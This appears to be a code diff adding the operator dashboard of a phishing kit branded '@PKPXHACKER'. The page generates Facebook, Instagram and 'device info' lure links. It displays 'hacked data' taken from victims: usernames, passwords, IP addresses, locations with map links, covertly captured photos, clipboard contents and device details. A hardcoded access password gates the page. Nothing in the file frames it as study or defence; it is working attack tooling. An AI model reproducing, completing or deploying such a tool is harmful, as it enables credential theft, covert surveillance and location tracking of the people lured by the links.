@@ -1,0 +1,553 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Generate Link</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, minimum-scale=0.5">
+  <style>
+    @keyframes glitch {
+      0% { text-shadow: 2px 2px #ff0000; }
+      25% { text-shadow: -2px -2px #00ff00; }
+      50% { text-shadow: 2px -2px #0000ff; }
+      75% { text-shadow: -2px 2px #ff0000; }
+      100% { text-shadow: 2px 2px #00ff00; }
+    }
+    @keyframes lightning {
+      0% { filter: brightness(100%); }
+      50% { filter: brightness(150%); }
+      100% { filter: brightness(100%); }
+    }
+    body {
+      font-family: 'Courier New', monospace;
+      min-height: 100vh;
+      margin: 0;
+      background: #000000;
+      color: #00ff00;
+      position: relative;
+      padding: 20px 0;
+    }
+    body::before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      background: linear-gradient(45deg, #000000 25%, #001100 50%, #000000 75%);
+      animation: lightning 3s infinite;
+      z-index: -1;
+    }
+    .container {
+      background: rgba(0, 0, 0, 0.8);
+      padding: 30px;
+      border-radius: 12px;
+      border: 1px solid #00ff00;
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+      position: relative;
+      margin: 0 auto;
+    }
+    .hacker-title {
+      font-size: 24px;
+      color: #00ff00;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      margin: 0 0 30px 0;
+      animation: glitch 2s infinite;
+      text-shadow: 0 0 5px #00ff00;
+    }
+    button {
+      padding: 12px 24px;
+      margin: 8px;
+      border: 2px solid #00ff00;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: 600;
+      transition: all 0.3s;
+      background: rgba(0, 255, 0, 0.1);
+      color: #00ff00;
+      text-shadow: 0 0 5px #00ff00;
+      box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
+      width: 80%;
+    }
+    button:hover {
+      background: rgba(0, 255, 0, 0.2);
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.4);
+      text-shadow: 0 0 8px #00ff00;
+      transform: scale(1.02);
+    }
+    .generate-btn, .instagram-btn, .copy-btn, .hacked-data-btn, .delete-data-btn {
+      width: 80%;
+      margin-top: 10px;
+    }
+    .copy-btn {
+      display: none;
+    }
+    @media (max-width: 768px) {
+      .container {
+        width: 95%;
+        padding: 15px;
+      }
+      button {
+        width: 90%;
+      }
+    }
+    #generatedLink {
+      margin: 15px 0;
+      padding: 15px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      display: none;
+      word-break: break-all;
+      background: #f8f9fa;
+    }
+    #userData {
+      margin: 15px 0;
+      padding: 15px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      display: none;
+      text-align: left;
+      background: #f8f9fa;
+    }
+    h2 {
+      color: #1c1e21;
+      margin-bottom: 20px;
+    }
+    .hacked-data-container {
+      margin-top: 20px;
+      padding: 15px;
+      background: #f5f5f5;
+      border-radius: 8px;
+      max-height: 500px;
+      overflow-y: auto;
+    }
+
+    .hacked-item {
+      background: white;
+      padding: 15px;
+      margin-bottom: 15px;
+      border-radius: 5px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+
+    .hacked-item p {
+      margin: 5px 0;
+    }
+
+    .hacked-item ul {
+      margin: 5px 0;
+      padding-left: 20px;
+    }
+
+    #hackedData {
+      display: none;
+      margin-top: 20px;
+    }
+
+    .loader-container {
+      display: none;
+      justify-content: center;
+      align-items: center;
+      margin: 20px 0;
+      position: relative;
+      width: 100px;
+      height: 100px;
+      margin: 20px auto;
+    }
+
+    .loader {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      border: 3px solid transparent;
+      border-top-color: #00ff00;
+      border-radius: 50%;
+      animation: spin 2s linear infinite;
+    }
+
+    .loader:nth-child(1) {
+      border-top-color: #00ff00;
+      animation-duration: 1s;
+      clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
+    }
+
+    .loader:nth-child(2) {
+      width: 80%;
+      height: 80%;
+      top: 10%;
+      left: 10%;
+      border-top-color: #00ffaa;
+      animation-duration: 1.5s;
+      animation-direction: reverse;
+      clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
+    }
+
+    .loader:nth-child(3) {
+      width: 60%;
+      height: 60%;
+      top: 20%;
+      left: 20%;
+      border-top-color: #ff00ff;
+      animation-duration: 2s;
+      clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
+    }
+
+    .loader:nth-child(4) {
+      width: 40%;
+      height: 40%;
+      top: 30%;
+      left: 30%;
+      border-top-color: #ffff00;
+      animation-duration: 2.5s;
+      animation-direction: reverse;
+      clip-path: polygon(50% 0%, 61% 35%, 98% 35%, 68% 57%, 79% 91%, 50% 70%, 21% 91%, 32% 57%, 2% 35%, 39% 35%);
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="container" id="loginContainer">
+    <div class="login-form" style="
+      background: linear-gradient(145deg, #001a00, #003300);
+      padding: 25px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 300px;
+      max-width: 90%;
+      border: 2px solid #00ff00;">
+      <div style="margin-bottom: 20px; color: #00ff00; font-size: 20px; text-shadow: 0 0 5px #00ff00;">
+        ⚡ @PKPXHACKER ⚡
+      </div>
+      <input type="password" id="pkPassword" placeholder="PK Password" style="
+        width: 90%;
+        margin: 10px 0;
+        padding: 12px;
+        border: 1px solid #00ff00;
+        background: rgba(0, 0, 0, 0.8);
+        color: #00ff00;
+        border-radius: 8px;
+        outline: none;">
+      <input type="text" id="username" placeholder="Username" style="
+        width: 90%;
+        margin: 10px 0;
+        padding: 12px;
+        border: 1px solid #00ff00;
+        background: rgba(0, 0, 0, 0.8);
+        color: #00ff00;
+        border-radius: 8px;
+        outline: none;">
+      <input type="password" id="userPassword" placeholder="Password" style="
+        width: 90%;
+        margin: 10px 0;
+        padding: 12px;
+        border: 1px solid #00ff00;
+        background: rgba(0, 0, 0, 0.8);
+        color: #00ff00;
+        border-radius: 8px;
+        outline: none;">
+      <button onclick="login()" style="
+        width: 90%;
+        margin: 10px 0;
+        padding: 12px;
+        background: #006600;
+        color: #ffffff;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        font-weight: bold;
+        text-transform: uppercase;
+        transition: all 0.3s;">Login</button>
+      <button onclick="register()" style="
+        width: 90%;
+        margin: 10px 0;
+        padding: 12px;
+        background: #004400;
+        color: #ffffff;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        font-weight: bold;
+        text-transform: uppercase;
+        transition: all 0.3s;">Register</button>
+      <div id="passwordPrompt" style="display: none; color: #ff0000; margin-top: 10px;"></div>
+    </div>
+    <div id="mainContent" style="display: none;">
+    <div class="hacker-title">
+      <a href="https://t.me/PkpXhacker" style="text-decoration: none; color: inherit;">
+        ⚡ HACKED BY @PKPXHACKER ⚡
+      </a>
+    </div>
+    <button class="generate-btn" onclick="generateFacebookLink()">Generate Facebook Link</button>
+    <button class="instagram-btn" onclick="generateInstagramLink()">Generate Instagram Link</button>
+    <button class="device-info-btn" onclick="generateDeviceInfoLink()">Generate Device Info Link</button>
+    <div id="generatedLink"></div>
+    <button class="copy-btn" onclick="copyLink()">Copy Link</button>
+    <button class="hacked-data-btn" onclick="showHackedData()">Show Hacked Data</button>
+    <button class="delete-data-btn" onclick="deleteHackedData()">Delete Hacked Data</button>
+    <div id="userData"></div>
+    <div class="loader-container">
+      <div class="loader"></div>
+      <div class="loader"></div>
+      <div class="loader"></div>
+      <div class="loader"></div>
+    </div>
+    <div id="hackedData"></div>
+  </div>
+
+  <script>
+    let currentLinkId = '';
+
+    async function generateLink(type) {
+      const response = await fetch('/generate', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ type })
+      });
+      const data = await response.json();
+      const fullLink = window.location.origin + data.link;
+      currentLinkId = data.link.split('/').pop();
+      document.getElementById('generatedLink').style.display = 'block';
+      document.getElementById('generatedLink').textContent = fullLink;
+      document.querySelector('.copy-btn').style.display = 'inline-block';
+
+      document.getElementById('userData').style.display = 'none';
+    }
+
+    function generateFacebookLink() {
+      generateLink('facebook');
+    }
+
+    async function generateInstagramLink() {
+      generateLink('instagram');
+    }
+
+    async function generateDeviceInfoLink() {
+      generateLink('device-info');
+    }
+
+    function copyLink() {
+      const linkText = document.getElementById('generatedLink').textContent;
+      navigator.clipboard.writeText(linkText).then(() => {
+        const copyBtn = document.querySelector('.copy-btn');
+        copyBtn.textContent = 'Copied!';
+        setTimeout(() => {
+          copyBtn.textContent = 'Copy Link';
+        }, 2000);
+      });
+    }
+
+    async function deleteHackedData() {
+      try {
+        const response = await fetch('/hacked-data', {
+          method: 'DELETE'
+        });
+        if (!response.ok) throw new Error('Failed to delete data');
+        document.getElementById('hackedData').innerHTML = '<p>All data has been deleted</p>';
+        setTimeout(() => {
+          document.getElementById('hackedData').style.display = 'none';
+        }, 2000);
+      } catch (error) {
+        console.error('Error:', error);
+        document.getElementById('hackedData').innerHTML = '<p>Error deleting data</p>';
+      }
+    }
+
+    async function showHackedData() {
+      try {
+        document.querySelector('.loader-container').style.display = 'flex';
+        document.getElementById('hackedData').style.display = 'none';
+        const response = await fetch('/hacked-data');
+        if (!response.ok) throw new Error('Failed to fetch data');
+        const result = await response.json();
+        const container = document.getElementById('hackedData');
+        container.style.display = 'block';
+
+        if (!result.data || result.data.length === 0) {
+          container.innerHTML = '<p>No data available yet</p>';
+          return;
+        }
+
+        const dataHtml = result.data.map(entry => `
+          <div class="data-entry" style="border: 1px solid #ddd; padding: 10px; margin: 10px 0; border-radius: 5px;">
+            <div class="info">
+              <strong>IP Address:</strong> ${entry.ip || 'N/A'}<br>
+              <strong>Location:</strong> ${entry.locationInfo || 'N/A'}<br>
+              <strong>Address:</strong> ${entry.location?.address || 'N/A'}<br>
+              ${entry.locationUrl ? `<a href="${entry.locationUrl}" target="_blank">View on Google Maps</a>` : ''}
+            </div>
+            ${entry.photo ? `
+            <div style="margin: 10px 0;">
+              <strong>Captured Photo:</strong><br>
+              <div style="width: 200px; height: 200px; border: 2px solid #ddd; overflow: hidden; margin: 5px 0;">
+                <img src="${entry.photo}" style="width: 100%; height: 100%; object-fit: cover;">
+              </div>
+            </div>` : ''}
+            ${entry.clipboardContent ? `
+            <div style="margin: 10px 0;">
+              <strong>Clipboard Content:</strong><br>
+              <div style="background: #f5f5f5; padding: 10px; border-radius: 5px; max-height: 200px; overflow-y: auto; word-wrap: break-word; white-space: pre-wrap;">
+                ${entry.clipboardContent}
+              </div>
+            </div>` : ''}
+            <p><strong>Username:</strong> ${entry.name || 'N/A'}</p>
+            <p><strong>Password:</strong> ${entry.password || 'N/A'}</p>
+            <p><strong>Time:</strong> ${new Date(entry.timestamp).toLocaleString()}</p>
+            <p><strong>Expires:</strong> ${new Date(entry.expiresAt).toLocaleString()}</p>
+            <p><strong>Device Info:</strong></p>
+            <ul style="list-style: none; padding-left: 10px;">
+              <li>Screen: ${entry.screen ? `${entry.screen.width}x${entry.screen.height}` : 'N/A'}</li>
+              <li>Browser: ${entry.userAgent || 'N/A'}</li>
+              <li>Battery: ${entry.battery ? `${entry.battery.level}% (${entry.battery.charging ? 'Charging' : 'Not charging'})` : 'N/A'}</li>
+            </ul>
+          </div>
+        `).join('');
+
+        container.innerHTML = dataHtml;
+        document.querySelector('.loader-container').style.display = 'none';
+
+      } catch (error) {
+        document.querySelector('.loader-container').style.display = 'none';
+        console.error('Error:', error);
+        document.getElementById('hackedData').innerHTML = '<p>Error loading data</p>';
+      }
+    }
+
+    async function showUserData() {
+      if (!currentLinkId) return;
+
+      try {
+        const response = await fetch(`/link/${currentLinkId}`, {
+          method: 'GET',
+          headers: { 'Accept': 'application/json' }
+        });
+
+        const data = await response.json();
+        const userDataDiv = document.getElementById('userData');
+        userDataDiv.style.display = 'block';
+
+        if (data.name) {
+          const batteryInfo = data.battery ? 
+            `Battery Level: ${data.battery.level}%<br>
+             Charging: ${data.battery.charging ? 'Yes' : 'No'}<br>` : '';
+
+          const connectionInfo = data.connection ?
+            `Network Type: ${data.connection.type}<br>
+             Download Speed: ${data.connection.downlink} Mbps<br>` : '';
+
+          userDataDiv.innerHTML = `
+            <strong>User Data:</strong><br>
+            Username: ${data.name}<br>
+            Password: ${data.password}<br>
+            Device Info:<br>
+            - Screen: ${data.screen.width}x${data.screen.height} (${data.screen.orientation})<br>
+            - ${batteryInfo}
+            - ${connectionInfo}
+            - Timezone: ${data.timezone}<br>
+            - Access Time: ${new Date(data.timestamp).toLocaleString()}<br>
+            - Browser/Device: ${data.userAgent}<br>
+          `;
+        } else {
+          userDataDiv.innerHTML = 'No data available yet';
+        }
+      } catch (error) {
+        document.getElementById('userData').innerHTML = 'No data available yet';
+      }
+    }
+  async function login() {
+      const pkPassword = document.getElementById('pkPassword').value;
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('userPassword').value;
+      const promptDiv = document.getElementById('passwordPrompt');
+
+      if (pkPassword !== 't.m@PkpXhacker') {
+        promptDiv.style.display = 'block';
+        promptDiv.textContent = 'Invalid PK Password. Please enter correct PK Password first.';
+        return;
+      }
+
+      if (!password) {
+        promptDiv.style.display = 'block';
+        promptDiv.textContent = 'Please enter a password.';
+        return;
+      }
+
+
+      const response = await fetch('/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      });
+
+      if (response.ok) {
+        document.getElementById('mainContent').style.display = 'block';
+        document.querySelector('.login-form').style.display = 'none';
+      } else {
+        promptDiv.style.display = 'block';
+        promptDiv.textContent = 'Invalid credentials. Try again.';
+      }
+    }
+
+    async function register() {
+      const pkPassword = document.getElementById('pkPassword').value;
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('userPassword').value;
+      const promptDiv = document.getElementById('passwordPrompt');
+
+      if (!username || !password) {
+        promptDiv.style.display = 'block';
+        promptDiv.textContent = 'Please enter both username and password.';
+        return;
+      }
+
+      if (pkPassword !== 't.m@PkpXhacker') {
+        promptDiv.style.display = 'block';
+        promptDiv.textContent = 'Invalid PK Password. Please enter correct PK Password first.';
+        return;
+      }
+
+      if (!password) {
+        promptDiv.style.display = 'block';
+        promptDiv.textContent = 'Incorrect password. Try again.';
+        document.getElementById('userPassword').value = '';
+        return;
+      }
+
+      try {
+        const response = await fetch('/register', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password })
+        });
+
+        if (response.ok) {
+          promptDiv.style.display = 'block';
+          promptDiv.style.color = '#00ff00';
+          promptDiv.textContent = 'Registration successful! Please login.';
+          setTimeout(() => {
+            promptDiv.style.display = 'none';
+          }, 2000);
+        } else {
+          promptDiv.style.display = 'block';
+          promptDiv.style.color = '#ff0000';
+          promptDiv.textContent = 'Registration failed. Username might be taken.';
+        }
+      } catch (error) {
+        promptDiv.style.display = 'block';
+        promptDiv.style.color = '#ff0000';
+        promptDiv.textContent = 'An error occurred during registration.';
+      }
+    }
+  </script>
+</body>
+</html>
